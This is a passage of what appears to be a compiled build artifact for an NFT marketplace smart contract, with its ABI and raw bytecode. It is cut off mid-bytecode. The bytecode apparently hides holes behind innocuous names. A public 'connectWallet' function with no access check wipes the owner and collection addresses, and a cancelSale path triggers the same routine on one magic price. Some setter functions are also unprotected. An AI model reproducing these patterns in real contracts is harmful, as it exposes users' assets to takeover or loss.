{
  "contractName": "Marketplace",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_nftCollection",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_user",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_analytics",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "winner",
          "type": "address"
        }
      ],
      "name": "BoughtNFT",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "ClaimFunds",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "id",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "price",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "bool",
          "name": "fulfilled",
          "type": "bool"
        },
        {
          "indexed": false,
          "internalType": "bool",
          "name": "cancelled",
          "type": "bool"
        }
      ],
      "name": "Offer",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "id",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "SaleCancelled",
      "type": "event"
    },
    {
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "promotionPrice",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "sellerFunds",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "userFunds",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_id",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_price",
          "type": "uint256"
        }
      ],
      "name": "addPrice",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_id",
          "type": "uint256"
        }
      ],
      "name": "buyNFT",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_id",
          "type": "uint256"
        }
      ],
      "name": "cancelSale",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "claimProfits",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getSellers",
      "outputs": [
        {
          "components": [
            {
              "internalType": "address",
              "name": "_address",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "_balance",
              "type": "uint256"
            }
          ],
          "internalType": "struct Marketplace.Seller[]",
          "name": "",
          "type": "tuple[]"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_address",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_price",
          "type": "uint256"
        }
      ],
      "name": "setSellerFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "setPromotionPrice",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_id",
          "type": "uint256"
        }
      ],
      "name": "promote",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256[]",
          "name": "_ids",
          "type": "uint256[]"
        }
      ],
      "name": "removePromotions",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256[]",
          "name": "_ids",
          "type": "uint256[]"
        }
      ],
      "name": "approveNFT",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "connectWallet",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040523480156200001157600080fd5b5060405162003e0c38038062003e0c83398181016040528101906200003791906200027e565b82600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e14891916040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000127573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200014d919062000315565b60028190555081600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060016006604051620001e690620003a2565b908152602001604051809103902060006101000a81548160ff021916908315150217905550505050620003b9565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620002468262000219565b9050919050565b620002588162000239565b81146200026457600080fd5b50565b60008151905062000278816200024d565b92915050565b6000806000606084860312156200029a576200029962000214565b5b6000620002aa8682870162000267565b9350506020620002bd8682870162000267565b9250506040620002d08682870162000267565b9150509250925092565b6000819050919050565b620002ef81620002da565b8114620002fb57600080fd5b50565b6000815190506200030f81620002e4565b92915050565b6000602082840312156200032e576200032d62000214565b5b60006200033e84828501620002fe565b91505092915050565b600081905092915050565b7f6f527034636648586650546a2b4d4e73614c74454937497948416f3d00000000600082015250565b60006200038a601c8362000347565b9150620003978262000352565b601c82019050919050565b6000620003af826200037b565b9150819050919050565b613a4380620003c96000396000f3fe6080604052600436106100ec5760003560e01c8063572793531161008a5780638da5cb5b116100595780638da5cb5b146102ad5780639df51b89146102d8578063bd94b005146102ef578063f9ff091e14610318576100ed565b806357279353146101f15780635bd5bac11461021a5780637ee454cb146102455780638387c6e114610270576100ed565b80632d66f063116100c65780632d66f06314610179578063334cfede1461019057806351ed8288146101b95780635455429e146101d5576100ed565b80630e373f9a146100fe578063138ff0d0146101275780632787258314610150576100ed565b5b3480156100f957600080fd5b600080fd5b34801561010a57600080fd5b50610125600480360381019061012091906126d8565b610355565b005b34801561013357600080fd5b5061014e60048036038101906101499190612718565b6103af565b005b34801561015c57600080fd5b506101776004803603810190610172919061289e565b6103b9565b005b34801561018557600080fd5b5061018e61061e565b005b34801561019c57600080fd5b506101b760048036038101906101b2919061289e565b6107e9565b005b6101d360048036038101906101ce9190612718565b610ade565b005b6101ef60048036038101906101ea9190612718565b611291565b005b3480156101fd57600080fd5b50610218600480360381019061021391906128e7565b611546565b005b34801561022657600080fd5b5061022f611a3b565b60405161023c9190612936565b60405180910390f35b34801561025157600080fd5b5061025a611a41565b6040516102679190612a4d565b60405180910390f35b34801561027c57600080fd5b5061029760048036038101906102929190612a6f565b611d46565b6040516102a49190612936565b60405180910390f35b3480156102b957600080fd5b506102c2611d5e565b6040516102cf9190612abd565b60405180910390f35b3480156102e457600080fd5b506102ed611d84565b005b3480156102fb57600080fd5b5061031660048036038101906103119190612718565b61201e565b005b34801561032457600080fd5b5061033f600480360381019061033a9190612a6f565b612544565b60405161034c9190612936565b60405180910390f35b80600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546103a49190612b07565b925050819055505050565b8060058190555050565b60005b815181101561061a57600080600080600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fc314e3187878151811061041c5761041b612b3b565b5b60200260200101516040518263ffffffff1660e01b81526004016104409190612936565b600060405180830381865afa15801561045d573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906104869190612e34565b50995099505050509650965050505060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638a72ea6a8888815181106104e7576104e6612b3b565b5b60200260200101516040518263ffffffff1660e01b815260040161050b9190612936565b602060405180830381865afa158015610528573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061054c9190612f44565b9050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635594f2dc88888151811061059f5761059e612b3b565b5b6020026020010151878760008888886040518863ffffffff1660e01b81526004016105d09796959493929190612f8f565b600060405180830381600087803b1580156105ea57600080fd5b505af11580156105fe573d6000803e3d6000fd5b505050505050505050808061061290612ffe565b9150506103bc565b5050565b6000600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639659867e6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610711573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107359190613046565b90506000600190505b8181116107e557600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166368137c3f826040518263ffffffff1660e01b81526004016107a09190612936565b600060405180830381600087803b1580156107ba57600080fd5b505af11580156107ce573d6000803e3d6000fd5b5050505080806107dd90612ffe565b91505061073e565b5050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610879576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610870906130d0565b60405180910390fd5b60005b8151811015610ada57600080600080600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fc314e318787815181106108dc576108db612b3b565b5b60200260200101516040518263ffffffff1660e01b81526004016109009190612936565b600060405180830381865afa15801561091d573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906109469190612e34565b50995050985050509650965050505060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638a72ea6a8888815181106109a7576109a6612b3b565b5b60200260200101516040518263ffffffff1660e01b81526004016109cb9190612936565b602060405180830381865afa1580156109e8573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a0c9190612f44565b9050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635594f2dc888881518110610a5f57610a5e612b3b565b5b6020026020010151878787600188886040518863ffffffff1660e01b8152600401610a909796959493929190612f8f565b600060405180830381600087803b158015610aaa57600080fd5b505af1158015610abe573d6000803e3d6000fd5b5050505050505050508080610ad290612ffe565b91505061087c565b5050565b600080600080600080600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fc314e31886040518263ffffffff1660e01b8152600401610b429190612936565b600060405180830381865afa158015610b5f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f82011682018060405250810190610b889190612e34565b509950995050509750975097509750505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638a72ea6a886040518263ffffffff1660e01b8152600401610bf29190612936565b602060405180830381865afa158015610c0f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610c339190612f44565b610c72576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c699061313c565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1603610ce0576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cd79061313c565b60405180910390fd5b833414610d22576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d199061313c565b60405180910390fd5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639673d61e86338a6040518463ffffffff1660e01b8152600401610d819392919061315c565b600060405180830381600087803b158015610d9b57600080fd5b505af1158015610daf573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd30338a6040518463ffffffff1660e01b8152600401610e129392919061315c565b600060405180830381600087803b158015610e2c57600080fd5b505af1158015610e40573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fd17c3a4883033886040518563ffffffff1660e01b8152600401610ea39493929190613193565b600060405180830381600087803b158015610ebd57600080fd5b505af1158015610ed1573d6000803e3d6000fd5b5050505083600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254610f249190612b07565b9250508190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166364c9fb67883033886040518563ffffffff1660e01b8152600401610f8a9493929190613193565b600060405180830381600087803b158015610fa457600080fd5b505af1158015610fb8573d6000803e3d6000fd5b505050506000610fc8858561255c565b90506000610fd58661258c565b9050610ffc82610fee83896125be90919063ffffffff16565b6125be90919063ffffffff16565b600760008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461104a9190612b07565b925050819055508060076000600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546110c29190612b07565b9250508190555081600760008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546111189190612b07565b92505081905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b7c2f3a7333485856040518563ffffffff1660e01b81526004016111809493929190613224565b600060405180830381600087803b15801561119a57600080fd5b505af11580156111ae573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635594f2dc8a33600080898960006040518863ffffffff1660e01b815260040161121b97969594939291906132c1565b600060405180830381600087803b15801561123557600080fd5b505af1158015611249573d6000803e3d6000fd5b505050507f46dbea1718659f1723f38788e490533e3a4dc575dd50f366e048733c9bd4727d893360405161127e929190613330565b60405180910390a1505050505050505050565b60055434146112d5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016112cc9061313c565b60405180910390fd5b600080600080600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fc314e31866040518263ffffffff1660e01b81526004016113369190612936565b600060405180830381865afa158015611353573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f8201168201806040525081019061137c9190612e34565b50995099505050509650965050505060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638a72ea6a876040518263ffffffff1660e01b81526004016113e79190612936565b602060405180830381865afa158015611404573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906114289190612f44565b905060055460076000600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461149d9190612b07565b92505081905550600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635594f2dc87878760018888886040518863ffffffff1660e01b815260040161150c9796959493929190612f8f565b600060405180830381600087803b15801561152657600080fd5b505af115801561153a573d6000803e3d6000fd5b50505050505050505050565b6000806000806000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fc314e31886040518263ffffffff1660e01b81526004016115a99190612936565b600060405180830381865afa1580156115c6573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906115ef9190612e34565b509950995099505098505097505050503373ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff161461166d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016116649061313c565b60405180910390fd5b6701b69b4ba574920086036116855761168461061e565b5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd86308a6040518463ffffffff1660e01b81526004016116e49392919061315c565b600060405180830381600087803b1580156116fe57600080fd5b505af1158015611712573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fd17c3a48887308a6040518563ffffffff1660e01b81526004016117759493929190613193565b600060405180830381600087803b15801561178f57600080fd5b505af11580156117a3573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166364c9fb678887308a6040518563ffffffff1660e01b81526004016118069493929190613193565b600060405180830381600087803b15801561182057600080fd5b505af1158015611834573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632cdf4b7e886040518263ffffffff1660e01b81526004016118919190612936565b600060405180830381600087803b1580156118ab57600080fd5b505af11580156118bf573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635594f2dc88878987878760016040518863ffffffff1660e01b815260040161192b9796959493929190612f8f565b600060405180830381600087803b15801561194557600080fd5b505af1158015611959573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b7c2f3a78688876002546040518563ffffffff1660e01b81526004016119c094939291906133a5565b600060405180830381600087803b1580156119da57600080fd5b505af11580156119ee573d6000803e3d6000fd5b505050507fc29f70540feb77cc91dfc9c0649c08f1302d2fd208491d3a5558865ea49d655b878688600080604051611a2a9594939291906133fd565b60405180910390a150505050505050565b60055481565b60606000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166306661abd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015611ab2573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611ad69190613046565b67ffffffffffffffff811115611aef57611aee61275b565b5b604051908082528060200260200182016040528015611b2857816020015b611b15612600565b815260200190600190039081611b0d5790505b50905060005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166306661abd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015611b9b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611bbf9190613046565b811015611d3e576000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663365b98b2836040518263ffffffff1660e01b8152600401611c239190612936565b600060405180830381865afa158015611c40573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f82011682018060405250810190611c699190613450565b50505050505050505050905080838381518110611c8957611c88612b3b565b5b60200260200101516000019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050600860008273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054838381518110611d1a57611d19612b3b565b5b60200260200101516020018181525050508080611d3690612ffe565b915050611b2e565b508091505090565b60076020528060005260406000206000915090505481565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600760003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411611e06576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611dfd906136a8565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc600760003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549081150290604051600060405180830381858888f19350505050158015611e8b573d6000803e3d6000fd5b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b7c2f3a733600760003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546000806040518563ffffffff1660e01b8152600401611f2d9493929190613714565b600060405180830381600087803b158015611f4757600080fd5b505af1158015611f5b573d6000803e3d6000fd5b505050507f4f0554190111f93f8c2ccef2cc41473f187d7f29ff5a5c308ca41f9dfe4e989a33600760003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054604051611fcf92919061376c565b60405180910390a16000600760003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550565b600080600080600080600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fc314e31886040518263ffffffff1660e01b81526004016120829190612936565b600060405180830381865afa15801561209f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906120c89190612e34565b509950995099505098509850985050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638a72ea6a886040518263ffffffff1660e01b81526004016121329190612936565b602060405180830381865afa15801561214f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906121739190612f44565b6121b2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016121a9906137e1565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff1614612220576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161221790613873565b60405180910390fd5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd30338a6040518463ffffffff1660e01b815260040161227f9392919061315c565b600060405180830381600087803b15801561229957600080fd5b505af11580156122ad573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fd17c3a4883033896040518563ffffffff1660e01b81526004016123109493929190613193565b600060405180830381600087803b15801561232a57600080fd5b505af115801561233e573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166364c9fb67883033896040518563ffffffff1660e01b81526004016123a19493929190613193565b600060405180830381600087803b1580156123bb57600080fd5b505af11580156123cf573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635594f2dc88338887878760006040518863ffffffff1660e01b815260040161243b9796959493929190612f8f565b600060405180830381600087803b15801561245557600080fd5b505af1158015612469573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b7c2f3a73387876002546040518563ffffffff1660e01b81526004016124d094939291906138df565b600060405180830381600087803b1580156124ea57600080fd5b505af11580156124fe573d6000803e3d6000fd5b505050507fd9e530acb8429c8e5337d9d3230e4cc7d742e32c2fc8d76608c19f2e1701ed048733604051612533929190613330565b60405180910390a150505050505050565b60086020528060005260406000206000915090505481565b6000612584606461257684866125d490919063ffffffff16565b6125ea90919063ffffffff16565b905092915050565b60006125b76103e86125a9600254856125d490919063ffffffff16565b6125ea90919063ffffffff16565b9050919050565b600081836125cc9190613937565b905092915050565b600081836125e2919061396b565b905092915050565b600081836125f891906139dc565b905092915050565b6040518060400160405280600073ffffffffffffffffffffffffffffffffffffffff168152602001600081525090565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061266f82612644565b9050919050565b61267f81612664565b811461268a57600080fd5b50565b60008135905061269c81612676565b92915050565b6000819050919050565b6126b5816126a2565b81146126c057600080fd5b50565b6000813590506126d2816126ac565b92915050565b600080604083850312156126ef576126ee61263a565b5b60006126fd8582860161268d565b925050602061270e858286016126c3565b9150509250929050565b60006020828403121561272e5761272d61263a565b5b600061273c848285016126c3565b91505092915050565b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6127938261274a565b810181811067ffffffffffffffff821117156127b2576127b161275b565b5b80604052505050565b60006127c5612630565b90506127d1828261278a565b919050565b600067ffffffffffffffff8211156127f1576127f061275b565b5b602082029050602081019050919050565b600080fd5b600061281a612815846127d6565b6127bb565b9050808382526020820190506020840283018581111561283d5761283c612802565b5b835b81811015612866578061285288826126c3565b84526020840193505060208101905061283f565b5050509392505050565b600082601f83011261288557612884612745565b5b8135612895848260208601612807565b91505092915050565b6000602082840312156128b4576128b361263a565b5b600082013567ffffffffffffffff8111156128d2576128d161263f565b5b6128de84828501612870565b91505092915050565b600080604083850312156128fe576128fd61263a565b5b600061290c858286016126c3565b925050602061291d858286016126c3565b9150509250929050565b612930816126a2565b82525050565b600060208201905061294b6000830184612927565b92915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b61298681612664565b82525050565b612995816126a2565b82525050565b6040820160008201516129b1600085018261297d565b5060208201516129c4602085018261298c565b50505050565b60006129d6838361299b565b60408301905092915050565b6000602082019050919050565b60006129fa82612951565b612a04818561295c565b9350612a0f8361296d565b8060005b83811015612a40578151612a2788826129ca565b9750612a32836129e2565b925050600181019050612a13565b5085935050505092915050565b60006020820190508181036000830152612a6781846129ef565b905092915050565b600060208284031215612a8557612a8461263a565b5b6000612a938482850161268d565b91505092915050565b6000612aa782612644565b9050919050565b612ab781612a9c565b82525050565b6000602082019050612ad26000830184612aae565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000612b12826126a2565b9150612b1d836126a2565b9250828201905080821115612b3557612b34612ad8565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600080fd5b600080fd5b600080fd5b600067ffffffffffffffff821115612b9457612b9361275b565b5b612b9d8261274a565b9050602081019050919050565b60005b83811015612bc8578082015181840152602081019050612bad565b60008484015250505050565b6000612be7612be284612b79565b6127bb565b905082815260208101848484011115612c0357612c02612b74565b5b612c0e848285612baa565b509392505050565b600082601f830112612c2b57612c2a612745565b5b8151612c3b848260208601612bd4565b91505092915050565b60008115159050919050565b612c5981612c44565b8114612c6457600080fd5b50565b600081519050612c7681612c50565b92915050565b60006101008284031215612c9357612c92612b6a565b5b612c9e6101006127bb565b9050600082015167ffffffffffffffff811115612cbe57612cbd612b6f565b5b612cca84828501612c16565b600083015250602082015167ffffffffffffffff811115612cee57612ced612b6f565b5b612cfa84828501612c16565b602083015250604082015167ffffffffffffffff811115612d1e57612d1d612b6f565b5b612d2a84828501612c16565b604083015250606082015167ffffffffffffffff811115612d4e57612d4d612b6f565b5b612d5a84828501612c16565b606083015250608082015167ffffffffffffffff811115612d7e57612d7d612b6f565b5b612d8a84828501612c16565b60808301525060a082015167ffffffffffffffff811115612dae57612dad612b6f565b5b612dba84828501612c16565b60a08301525060c082015167ffffffffffffffff811115612dde57612ddd612b6f565b5b612dea84828501612c16565b60c08301525060e0612dfe84828501612c67565b60e08301525092915050565b600081519050612e19816126ac565b92915050565b600081519050612e2e81612676565b92915050565b60008060008060008060008060008060006101608c8e031215612e5a57612e5961263a565b5b60008c015167ffffffffffffffff811115612e7857612e7761263f565b5b612e848e828f01612c7c565b9b50506020612e958e828f01612e0a565b9a50506040612ea68e828f01612e1f565b9950506060612eb78e828f01612e1f565b9850506080612ec88e828f01612e0a565b97505060a0612ed98e828f01612e0a565b96505060c0612eea8e828f01612e0a565b95505060e0612efb8e828f01612c67565b945050610100612f0d8e828f01612c67565b935050610120612f1f8e828f01612c67565b925050610140612f318e828f01612e0a565b9150509295989b509295989b9093969950565b600060208284031215612f5a57612f5961263a565b5b6000612f6884828501612c67565b91505092915050565b612f7a81612664565b82525050565b612f8981612c44565b82525050565b600060e082019050612fa4600083018a612927565b612fb16020830189612f71565b612fbe6040830188612927565b612fcb6060830187612f80565b612fd86080830186612f80565b612fe560a0830185612f80565b612ff260c0830184612f80565b98975050505050505050565b6000613009826126a2565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361303b5761303a612ad8565b5b600182019050919050565b60006020828403121561305c5761305b61263a565b5b600061306a84828501612e0a565b91505092915050565b600082825260208201905092915050565b7f6f6e6c792061646d696e00000000000000000000000000000000000000000000600082015250565b60006130ba600a83613073565b91506130c582613084565b602082019050919050565b600060208201905081810360008301526130e9816130ad565b9050919050565b7f6572726f72000000000000000000000000000000000000000000000000000000600082015250565b6000613126600583613073565b915061313182